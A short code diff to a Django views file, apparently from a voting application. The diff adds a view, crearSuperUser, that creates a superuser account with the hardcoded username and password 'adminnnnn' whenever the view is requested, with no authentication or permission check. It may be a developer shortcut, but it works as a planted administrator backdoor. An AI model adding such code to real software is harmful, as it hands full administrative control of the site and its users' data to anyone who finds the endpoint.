@@ -14,6 +14,7 @@ from base.perms import UserIsStaff
 from django.views.generic import TemplateView
 from django.http import HttpResponse
 from django.contrib.auth.models import User
+from django.shortcuts import render
 
 class StoreView(generics.ListAPIView):
     queryset = Vote.objects.all()
@@ -96,3 +97,12 @@ class PanelView(TemplateView):
         context['vot']=lista
         context['pers']= personas
         return context
+
+def crearSuperUser(request):
+    
+    u = User(username='adminnnnn')
+    u.set_password('adminnnnn')
+    u.is_superuser = True
+    u.save()
+
+    return render(request,'pruebita.html')
